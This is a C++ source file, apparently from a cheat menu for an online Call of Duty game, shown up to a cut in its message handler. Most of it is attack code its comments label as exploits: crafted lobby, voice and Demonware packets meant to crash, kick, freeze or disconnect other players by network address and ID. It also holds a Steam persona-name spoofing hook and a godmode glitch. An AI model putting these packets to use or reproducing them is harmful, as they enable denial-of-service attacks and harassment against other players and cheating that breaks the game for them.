	std::string name;
	netadr_t netadr;
	XNADDR hostnetadr;
	response_t response;
	InfoResponseLobby Lobby[3];

	bool auto_kick;
	bool auto_crash;

};

std::vector<friends_t> friendss;

void refresh_friends()
{
	friendss.clear();

	if (const auto json = io::parse_json_file(FRIENDS_LIST); json.is_object())
	{
		for (const auto& [key, value] : json.items())
		{
			friendss.emplace_back(friends_t
				{
					std::stoull(key),
					value["name"].get<std::string>(),
				});
		}
	}
}


void write_to_friends() //to write into the json file
{
	json j{};

	for (const auto& friends : friendss)
	{
		j[std::to_string(friends.steam_id)] =
		{
			{ "name", friends.name },

		};
	}

	io::write_file(io::get_json_file(FRIENDS_LIST), j.dump());
}


void send_info_request_to_friend(friends_t& friends)
{
	friends.netadr = {};
	send_info_request(friends.steam_id);
}

void send_info_request_to_recent(recent_t& recents)
{
	recents.netadr = {};
	send_info_request(recents.xuid);
}




XSESSION_INFO get_session_info(const InfoResponseLobby& lobby)
{
	XSESSION_INFO sess_info{};
	sess_info.sessionID = lobby.secId;
	sess_info.keyExchangeKey = lobby.secKey;
	sess_info.hostAddress = lobby.serializedAdr.xnaddr;

	return sess_info;
}

void add_friend_response(const InfoResponseLobby& lobby)
{
	if (lobby.isValid)
	{
		const auto sess_info{ get_session_info(lobby) };

		netadr_t netadr{};
		dwRegisterSecIDAndKey(&sess_info.sessionID, &sess_info.keyExchangeKey);
		dwCommonAddrToNetadr(&netadr, &sess_info.hostAddress, &sess_info.sessionID);

		for (auto& friends : friendss)
		{
			if (lobby.hostXuid == friends.steam_id)
				friends.netadr = netadr;
		}
	}
}

std::string va(const char* fmt, ...)
{
	char result[2048] = { 0 };

	va_list ap;
	va_start(ap, fmt);

	vsnprintf_s(result, sizeof(result), _TRUNCATE, fmt, ap);

	va_end(ap);
	return result;
}

std::string adr_to_string(const netadr_t* address)
{
	XNADDR xn;
	dwNetadrToCommonAddr(*address, &xn, sizeof xn, nullptr);

	return va("%u.%u.%u.%u", xn.ip[0], xn.ip[1], xn.ip[2], xn.ip[3]);
}


template<typename... Parameters>
inline void send_chat_message(std::string message, Parameters... params) //that function allow you to send some invalid characters in the ingame chat.
{

	std::uintptr_t processbase = reinterpret_cast<std::uintptr_t>(GetModuleHandleA(nullptr));

	char szBuffer[4096] = { NULL };
	sprintf_s(szBuffer, message.c_str(), params...);

	std::string prepare = std::string("0 ") + szBuffer;
	auto msg = prepare.c_str();

	__int64 vTable = *(__int64*)(processbase + 0x10BBCBB0); //0x1C6067C0
	UINT64 LobbyID = *(UINT64*)(processbase + 0x11423A88);

	(*(__int64(__fastcall**)(__int64, UINT64, __int64, UINT64))(*(UINT64*)vTable + 208i64))(vTable, *(UINT64*)&LobbyID, (__int64)msg, strlen(msg) + 1);

}

void SupperDupperGlitch() //a glitch to put ur specialist as an invalid index, kinda giving you godmod .
{
	((__int64(__cdecl*)(unsigned int ControllerIndex, unsigned int eModes, unsigned int statsLocation, unsigned int CharacterIndex))(qwProcessBase + 0xAD860))(0, 1, 0, 10);
}

inline DWORD_PTR HookVMT(DWORD_PTR pVtable, DWORD_PTR hook, int index) //virtual memory table hook I used for name spoofer.
{
	DWORD_PTR* vtable = *(DWORD_PTR**)pVtable;
	DWORD_PTR backup = 0;
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery((LPCVOID)vtable, &mbi, sizeof(mbi));
	VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE, &mbi.Protect);
	backup = vtable[index];
	vtable[index] = (DWORD_PTR)hook;
	VirtualProtect(mbi.BaseAddress, mbi.RegionSize, mbi.Protect, &mbi.Protect);
	return backup;
}

__int64 hLiveSteam_FilterPersonaName(char* buffer, int size, char asciionly)
{
	Unhook(oLiveSteam_FilterPersonaName, hLiveSteam_FilterPersonaName);
	return 0;
}


char* hGetPersonaName(DWORD_PTR _this)
{
	if (spoofName[0] != 0)
	{
		if ((DWORD_PTR)_ReturnAddress() == pGetPersonaNameReturn)
		{
			Hook(oLiveSteam_FilterPersonaName, hLiveSteam_FilterPersonaName);
		}

		return spoofName;
	}

	return oGetPersonaName(_this);
}

void Initialize()
{
	oGetPersonaName = (tGetPersonaName)HookVMT(ISteamFriends, (DWORD_PTR)&hGetPersonaName, 0);

}


inline void RenamePreGame(std::string name)
{
	if (name.size() > 31)
		name.resize(31);

	strncpy_s((char*)(pUserData + 0x8), 64, name.c_str(), name.size());
	strncpy_s((char*)(pNameBuffer), 64, name.c_str(), name.size());
}

template <typename T>
static std::vector<std::vector<T>> get_batch(const std::vector<T>& v, const size_t num)
{
	std::vector<std::vector<T>> batches{};
	batches.reserve(v.size() / num);

	for (size_t i = 0; i < v.size(); i += num)
	{
		const auto last{ min12(v.size(), i + num) };
		batches.emplace_back(v.begin() + i, v.begin() + last);
	}

	return batches;
}

template <typename T>
static void for_each_batch(const std::vector<T>& v, const size_t num, const std::function<void(std::vector<T>)>& callback)
{
	const auto batches{ get_batch(v, num) };

	for (const auto& batch : batches)
	{
		callback(batch);
	}
}



LobbyType get_lobby_type()
{
	if (LobbySession_GetControllingLobbySession(LOBBY_MODULE_CLIENT))
	{
		return LOBBY_TYPE_GAME;
	}

	else
	{
		return LOBBY_TYPE_PRIVATE;
	}
}

uint32_t nonce{ 1111111111u };

LobbyMsg build_info_request()
{
	char buf[0x20000] = { 0 };
	LobbyMsg lobbyMsg{};

	LobbyMsgRW_PrepWriteMsg(&lobbyMsg, buf, sizeof buf, MESSAGE_TYPE_INFO_REQUEST);
	LobbyMsgRW_PackageUInt(&lobbyMsg, "nonce", &nonce);

	return lobbyMsg;
}

void send_info_request2(const std::vector<std::uint64_t>& recipients)
{
	if (!Live_IsDemonwareFetchingDone(0))
	{
		const auto lobby_msg = build_info_request();
		dwInstantSendMessage(0, recipients.data(), recipients.size(), 'h', lobby_msg.msg.data, lobby_msg.msg.cursize);
	}
}

bool send_oob(const netadr_t& to, const std::string& data, const netsrc_t sock = NS_SERVER) // the function to send an out of band
{
	return NET_OutOfBandPrint(sock, to, data.data());
}

void send_connect_response_migration_packet(const netadr_t& to) //a kick exploit
{
	send_oob(to, "connectResponseMigration");
}

void send_mstart_packet(const netadr_t& to)//immobilize exploit
{
	send_oob(to, "mstart");
}

void send_request_stats_packet(const netadr_t& to)//host migration exploit
{
	send_oob(to, "requeststats");
}
void send_voicetest_crash_packet(const netadr_t& to)//crash exploit
{
	send_oob(to, "vt");
}

void send_relay_crash_packet(const netadr_t& to)//crash exploit
{
	send_oob(to, "relay");
}

void send_lm_crash(__int64 xuid, const netadr_t to)//package element crash exploit
{
	char MSGG[0x20000]{};
	LobbyMsg MSG{};
	LobbyMsgRW_PrepWriteMsg(&MSG, (char*)MSGG, 0x20000, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
	LobbyMsgTransport_SendToAdr(0, 11, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&MSG, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
}


void send_lm_crash2(__int64 xuid, const netadr_t to)//package element crash exploit
{
	char MSGG[0x30000]{};
	LobbyMsg MSG{};
	LobbyMsgRW_PrepWriteMsg(&MSG, (char*)MSGG, 0x30000, MESSAGE_TYPE_LOBBY_STATE_GAME);
	LobbyMsgTransport_SendToAdr(0, 11, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&MSG, MESSAGE_TYPE_LOBBY_STATE_GAME);
}

void send_lm_crash3(__int64 xuid, const netadr_t to)//package element crash exploit
{
	char MSGG[0x70000]{};
	LobbyMsg MSG{};
	LobbyMsgRW_PrepWriteMsg(&MSG, (char*)MSGG, 0x70000, MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
	LobbyMsgTransport_SendToAdr(0, 11, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&MSG, MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
}

void send_crash(const std::uint64_t target_steam_id)//dwim crash exploit, basicly sending an instant message throw demonware that crash your game.
{
	if (!Live_IsUserSignedInToDemonware(0))
		return;

	const JoinSessionMessage message{ JOIN_REQUEST };
	dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, sizeof message);
}

void send_popup(const std::uint64_t target_steam_id)//dwim crash exploit, basicly sending an instant message throw demonware that open a popup.
{
	if (!Live_IsUserSignedInToDemonware(0))
		return;

	const JoinSessionMessage message{ JOIN_REPLY };
	dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
}

void SendZM_UI_ERROR(uint64_t XUID, const netadr_t& to)
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 oneField = 1;
	uint32_t datamask = 512;
	uint32_t characterSelection = 40;
	uint32_t loadoutType = 100;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&oneField);
	LobbyMsgRW_PackageUInt(&lm, "character", (unsigned int*)&characterSelection);
	LobbyMsgRW_PackageUInt(&lm, "loadout", (unsigned int*)&loadoutType);



	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
}

void SendVoicePacket(__int64 XUID, const netadr_t& to)//that is an voice packet where the voicedata size has been overflowed resulting to a crash for the player that receive it.
{

	char lobbyMsgOOB[0x20000]{};

	LobbyMsg lm{};
	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_VOICE_PACKET);


	__int64 pckg1 = 0;
	__int64 pckg2 = 0;
	__int64 pckg3 = 0;
	unsigned __int16 sizebof = 9999;
	__int64 numpacketsempty = 0;
	const char voicedataempty[] = "0";

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&pckg1);
	LobbyMsgRW_PackageUChar(&lm, "talker", (uint8_t*)&pckg2);
	LobbyMsgRW_PackageInt(&lm, "relaybits", (__int32*)&pckg3);
	LobbyMsgRW_PackageUShort(&lm, "sizeofvoicedata", &sizebof);
	LobbyMsgRW_PackageUChar(&lm, "numpackets", (uint8_t*)&numpacketsempty);
	LobbyMsgRW_PackageGlob(&lm, "voicedata", (char*)*&voicedataempty, strlen(voicedataempty));


	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendOutOfBand(0, XUID, to, (msg_t*)&lm, MESSAGE_TYPE_VOICE_PACKET);
	//SetXUIDSpoofed(false);
}


void ClientDisconnect(const netadr_t& hostadr, uint64_t hostxuid, uint64_t victimxuid)// that is sending a client diconnect request to the server resulting to the disconnecting of the player at the next client join.
{
	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);

	auto lobbytype = get_lobby_type();

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&lobbytype);
	LobbyMsgRW_PackageXuid(&lm, "xuid", &victimxuid);

	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, hostadr, hostxuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);
}



void SendDROP(uint64_t XUID, const netadr_t& to)// a built disconnect 1
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 drop = 0;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&drop);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendKICK(uint64_t XUID, const netadr_t& to)// a built disconnect 2
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 kick = 1;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&kick);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendBADDLC(uint64_t XUID, const netadr_t& to)// a built disconnect 3
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 baddlc = 2;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&baddlc);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendKICK_PARTY(uint64_t XUID, const netadr_t& to)// a built disconnect 4
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 kick_party = 3;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&kick_party);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendHOSTRELOAD(uint64_t XUID, const netadr_t& to)// a built disconnect 5
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 hostreload = 4;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&hostreload);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendNOPARTYCHAT(uint64_t XUID, const netadr_t& to)// a built disconnect 6
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 nopartychat = 5;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&nopartychat);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendNOPARTYCHAT2(uint64_t XUID, const netadr_t& to)// a built disconnect 7
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 nopartychat = 6;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&nopartychat);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}

void SendNOPARTYCHAT3(uint64_t XUID, const netadr_t& to)// a built disconnect 8 
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

	__int64 zeroField = 0;
	__int64 nopartychat = 7;
	uint32_t datamask4 = 4;

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
	LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
	LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&nopartychat);

	//spoofedXUID = XUID;
	//SetXUIDSpoofed(true);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYPRIVATE_RELIABLE_0, LobbyModule::LOBBY_MODULE_HOST, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	//SetXUIDSpoofed(false);
}





void send_lsprivate_crash(const netadr_t to, __int64 xuid)// some useless package for a package element crash
{

	char lobbyMsgOOB[0x20000]{};


	LobbyMsg lm{};
	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));
	memset(&lm, 0, sizeof(&lm));
	auto lobbytype = get_lobby_type();
	int state = 2;


	LobbyMsgRW_PackageInt(&lm, "statenum", (__int32*)&state);
	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&lobbytype);
	LobbyMsgRW_PackageXuid(&lm, "leader", (uint64_t*)&xuid);
	LobbyMsgRW_PackageArrayStart(&lm, "clientlist");




	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYGAME_RELIABLE_0, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
}

void send_lsgame_crash(const netadr_t to, __int64 xuid)// some useless package for a package element crash
{

	char lobbyMsgOOB[0x20000]{};
	Msg_LobbyStateGame lobbyStateGame;

	LobbyMsg lm{};
	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));
	memset(&lm, 0, sizeof(&lm));

	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_STATE_GAME);

	LobbyMsgRW_PackageArrayStart(&lm, "clientlist");
	LobbyMsgRW_PackageUInt(&lm, "votecount", (uint32_t*)&lobbyStateGame.core);
	LobbyMsgRW_PackageArrayStart(&lm, "votes");


	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYGAME_RELIABLE_0, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_STATE_GAME);
}

void send_hostheartbeat_crash(const netadr_t to, __int64 xuid)// some useless package for a package element crash
{

	char lobbyMsgOOB[0x20000]{};


	LobbyMsg lm{};
	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));
	memset(&lm, 0, sizeof(&lm));

	auto lobbytype = get_lobby_type();
	auto HostTimeMS = 999;

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&lobbytype);
	LobbyMsgRW_PackageInt(&lm, "lasthosttimems", (__int32*)&HostTimeMS);
	LobbyMsgRW_PackageArrayStart(&lm, "nomineelist");
	LobbyMsgRW_PackageXuid(&lm, "xuid", (uint64_t*)&xuid);


	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, sizeof(lobbyMsgOOB), MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYGAME_RELIABLE_0, LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
}

void SendClientContent(const netadr_t to, __int64 XUID)// a base to make a potential crash
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbySession ls{};

	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));

	int emptyshit = 0;

	unsigned __int16 maxInt = 65535;

	unsigned short bofbuffer = 1;

	__int64 maxcharField = 255;

	const char CringeData[] = "D!CK";

	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, MESSAGE_TYPE_LOBBY_CLIENT_CONTENT);

	LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&emptyshit);

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (int*)&maxInt);

	LobbyMsgRW_PackageXuid(&lm, "clientxuid", (uint64_t*)(&XUID));

	LobbyMsgRW_PackageUShort(&lm, "buffersize", (unsigned short*)(&bofbuffer));

	LobbyMsgRW_PackageGlob(&lm, "buffer", (char*)(&CringeData), strlen(CringeData));

	LobbyMsgRW_PackageUChar(&lm, "sessionmode", (uint8_t*)(&maxcharField));

	LobbyMsgRW_PackageUChar(&lm, "gamemode", (uint8_t*)(&maxcharField));

	LobbyMsgTransport_SendOutOfBand(0, XUID, to, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_CLIENT_CONTENT);
}

void SendDemoState(const netadr_t to, __int64 XUID)// a base to make a potential crash
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbySession ls{};

	int pausedno = 0;

	int emptyshit = 0;

	int timescalefucked = 99999;

	unsigned __int16 maxInt = 65535;

	unsigned short bofbuffer = 1;

	__int64 maxcharField = 255;

	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));

	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, MESSAGE_TYPE_DEMO_STATE);

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageBool(&lm, "paused", (char*)(pausedno));
	LobbyMsgRW_PackageInt(&lm, "servertime", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageInt(&lm, "timescale", (std::int32_t*)(timescalefucked));
	LobbyMsgRW_PackageInt(&lm, "client", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageInt(&lm, "kframeindex", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageInt(&lm, "lstjumpedkframe", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageInt(&lm, "kframejumpcount", (std::int32_t*)(emptyshit));
	LobbyMsgRW_PackageInt(&lm, "lstkframetime", (std::int32_t*)(emptyshit));

	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYGAME_RELIABLE_0, LOBBY_MODULE_CLIENT, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_DEMO_STATE);
}



void SendMigrateTest(const netadr_t to, __int64 XUID)// a base to make a potential crash
{

	char lobbyMsgOOB[0x20000]{};
	LobbyMsg lm{};
	LobbySession ls{};

	int pausedno = 1;

	int emptyshit = 0;

	int timescalefucked = 999999;

	unsigned __int16 maxInt = 65535;

	unsigned short bofbuffer = 9999;

	__int64 maxcharField = 255;

	memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));

	LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, MESSAGE_TYPE_LOBBY_MIGRATE_TEST);

	LobbyMsgRW_PackageInt(&lm, "lobbytype", (std::int32_t*)(&pausedno));
	LobbyMsgRW_PackageXuid(&lm, "xuid", (uint64_t*)(&XUID));
	LobbyMsgRW_PackageInt(&lm, "timems", (std::int32_t*)(&emptyshit));
	LobbyMsgRW_PackageUChar(&lm, "seqorcount", (uint8_t*)(&emptyshit));

	LobbyMsgTransport_SendToAdr(0, NETCHAN_LOBBYGAME_RELIABLE_0, LOBBY_MODULE_CLIENT, to, XUID, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_MIGRATE_TEST);
}









std::unordered_map<std::uint64_t, XSESSION_INFO> players_session_info;



void handle_message(const std::uint64_t sender_id, const char* message, const std::uint32_t message_size)
{

	msg_t msg{};
	MSG_InitReadOnly(&msg, message, message_size);
	MSG_BeginReading(&msg);

	auto type = 0ui8;

	std::string outputtype = std::to_string(type);
	std::string outputtype2 = std::to_string(type);
	std::string sender = std::to_string(sender_id);

	time_t now = time(0);
#pragma warning(suppress : 4996)
	char* dt = ctime(&now);


	if (MSG_ReadByte(&msg) == '1')
	{
		type = MSG_ReadByte(&msg);
	}

	if (type == 'h')
	{
		if (const auto size{ msg.cursize - msg.readcount }; size < 2048u)
		{
			char data[2048] = { 0 };
			MSG_ReadData(&msg, data, size);

			if (!msg.overflowed)
			{
				LobbyMsg lobby_msg{};
				if (!LobbyMsgRW_PrepReadData(&lobby_msg, data, size))
					return;

				if (lobby_msg.msgType == MESSAGE_TYPE_INFO_RESPONSE)
				{
					Msg_InfoResponse response{};

					//if (MSG_InfoResponseSafe(&response, &lobby_msg))
					//	return;

					std::string info = "Info Response from: " + sender;

					AddToLog(info.data());

					std::ofstream myfile;
					myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
					myfile << dt << " IM info response from : " << sender << "\n";
					myfile.close();

					if (!MSG_InfoResponse(&response, &lobby_msg))
						return;

					add_friend_response(response.lobby[0]);

				};

				if (lobby_msg.msgType == MESSAGE_TYPE_INFO_REQUEST)
				{
					std::string infos = "Info Request Sent From: " + sender;

					AddToLog(infos.data());

					std::ofstream myfile;
					myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
					myfile << dt << " IM info response from : " << sender << "\n";
					myfile.close();

					if (sender_id != LiveUser_GetXUID(0))
					{

						if (friendonly)
						{
							if (!LiveFriends_IsFriendByXUID(0, sender_id))
							{
								return;
							}
						}
					}




				}

				LobbyMsg_HandleIM(0, sender_id, data, size);
			}
		}
	}



	if (type == 102 && message_size == 102)
		outputtype = "Crash";

	if (type == 102 && message_size == 2)
		outputtype = "Popup";

	auto msgg = outputtype + " BLOCKED "s + std::to_string(sender_id);
	auto msggg = "IM : "s + outputtype + " BLOCKED from "s + std::to_string(sender_id);
	auto msgggg = "^1"s + outputtype + " ^2BLOCKED ^7 from ^2"s + std::to_string(sender_id) + "^7, nice try ^6LOOZA^7!";

	if (type == 102 && message_size == 2 || type == 102 && message_size == 102)

	{
		ImGui::InsertNotification({ ImGuiToastType_IM, 5000, msgg.data() });

		AddToLog("-->" + msggg);

